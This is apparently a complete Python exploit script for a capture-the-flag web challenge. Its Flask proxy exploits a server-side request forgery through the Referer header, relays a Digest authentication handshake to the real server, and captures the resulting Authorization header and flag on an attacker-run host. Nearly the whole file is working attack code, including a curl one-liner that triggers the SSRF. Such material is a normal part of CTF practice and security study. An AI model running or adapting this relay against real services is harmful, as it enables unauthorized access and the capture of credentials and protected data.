#!/usr/bin/env python3
"""
SSRF Exploit for Flask Digest Auth Challenge - Transparent Proxy
This proxies the Digest auth flow and captures the authenticated response
"""

from flask import Flask, request, Response
import requests

app = Flask(__name__)

# The real challenge server
REAL_SERVER = "https://authman.challs.pwnoh.io/"  # Change this!

captured_data = {
    'flag': None,
    'auth_header': None
}

@app.route('/auth', methods=['GET'])
def transparent_proxy():
    """
    Transparently proxy the Digest auth flow:
    1. Forward initial request to real server
    2. Get back 401 + WWW-Authenticate with real nonce
    3. Return that to the client (challenge server making SSRF request)
    4. Client computes correct hash and retries
    5. Forward that authenticated request to real server
    6. Capture the response with the flag!
    """
    
    print(f"\n[+] Received request to /auth")
    print(f"[+] Headers: {dict(request.headers)}")
    
    auth_header = request.headers.get('Authorization', '')
    
    if auth_header:
        print(f"[+] Got authenticated request!")
        print(f"[+] Authorization: {auth_header[:50]}...")
        captured_data['auth_header'] = auth_header
    
    # Forward the request to the real server with all headers
    headers = dict(request.headers)
    # Remove Host header as requests will set it
    headers.pop('Host', None)
    
    try:
        # Make request to REAL server
        resp = requests.get(
            f"{REAL_SERVER}/auth",
            headers=headers,
            timeout=5,
            allow_redirects=False
        )
        
        print(f"[+] Real server response: {resp.status_code}")
        print(f"[+] Response headers: {dict(resp.headers)}")
        
        if resp.status_code == 200:
            print(f"\n{'='*60}")
            print(f"[!] SUCCESS! Got authenticated response!")
            print(f"[!] Response body:\n{resp.text}")
            print(f"{'='*60}\n")
            captured_data['flag'] = resp.text
        
        # Create response with same status and headers from real server
        response = Response(resp.content, resp.status_code)
        
        # Copy important headers
        for header, value in resp.headers.items():
            if header.lower() not in ['content-encoding', 'transfer-encoding', 'content-length']:
                response.headers[header] = value
        
        return response
        
    except Exception as e:
        print(f"[-] Error proxying request: {e}")
        return Response("Proxy Error", 500)

@app.route('/status', methods=['GET'])
def status():
    """Check if we captured the flag"""
    return {
        'flag_captured': captured_data['flag'] is not None,
        'flag': captured_data['flag'],
        'auth_header': captured_data['auth_header']
    }

def start_proxy(port=80):
    """Start the proxy server"""
    print(f"[+] Starting transparent proxy on port {port}")
    print(f"[+] Proxying to: {REAL_SERVER}")
    print(f"[+] Access status at: http://localhost:{port}/status")
    app.run(host='0.0.0.0', port=port, debug=False)

def trigger_exploit(target_url, proxy_url):
    """
    Trigger the SSRF to make the server authenticate through our proxy
    
    Args:
        target_url: The challenge server URL (e.g., http://challenge.com)
        proxy_url: Your proxy server URL (e.g., http://your-vps.com:8080)
    """
    print(f"\n[+] Triggering SSRF exploit")
    print(f"[+] Target: {target_url}")
    print(f"[+] Proxy: {proxy_url}")
    
    # Make request to /api/check with Referer set to our proxy
    headers = {
        'Referer': proxy_url  # The SSRF will append /auth to this
    }
    
    try:
        response = requests.get(
            f"{target_url}/api/check",
            headers=headers,
            timeout=10
        )
        
        print(f"\n[+] SSRF Response status: {response.status_code}")
        print(f"[+] SSRF Response: {response.text}")
        
        resp_json = response.json()
        status = resp_json.get('status')
        
        if status == 200:
            print(f"\n[!] Success! The server authenticated through our proxy!")
            print(f"[!] Check your proxy logs or visit {proxy_url}/status for the flag")
        else:
            print(f"\n[-] Got status code: {status}")
            print(f"[-] This might mean authentication failed or proxy issue")
            
    except Exception as e:
        print(f"[-] Error triggering exploit: {e}")

if __name__ == '__main__':
    import sys
    
    print("""
╔═══════════════════════════════════════════════════════════╗
║  SSRF + Digest Auth Transparent Proxy Exploit             ║
╚═══════════════════════════════════════════════════════════╝
""")
    
    if len(sys.argv) < 2:
        print("Usage:")
        print("  1. Edit REAL_SERVER in the script to point to challenge")
        print("  2. Start proxy: python exploit.py proxy [port]")
        print("  3. In another terminal/machine:")
        print("     Trigger SSRF: python exploit.py exploit <target_url> <your_proxy_url>")
        print("\nExample:")
        print("  Terminal 1: python exploit.py proxy 8080")
        print("  Terminal 2: python exploit.py exploit http://challenge.com http://YOUR-VPS-IP:8080")
        print("\nOr use curl to trigger:")
        print("  curl -H 'Referer: http://YOUR-VPS-IP:8080' http://challenge.com/api/check")
        sys.exit(1)
    
    mode = sys.argv[1]
    
    if mode == 'proxy':
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
        start_proxy(port)
    
    elif mode == 'exploit':
        if len(sys.argv) < 4:
            print("[-] Need target URL and proxy URL")
            print("[-] Usage: python exploit.py exploit <target> <proxy>")
            sys.exit(1)
        target_url = sys.argv[2]
        proxy_url = sys.argv[3]
        trigger_exploit(target_url, proxy_url)
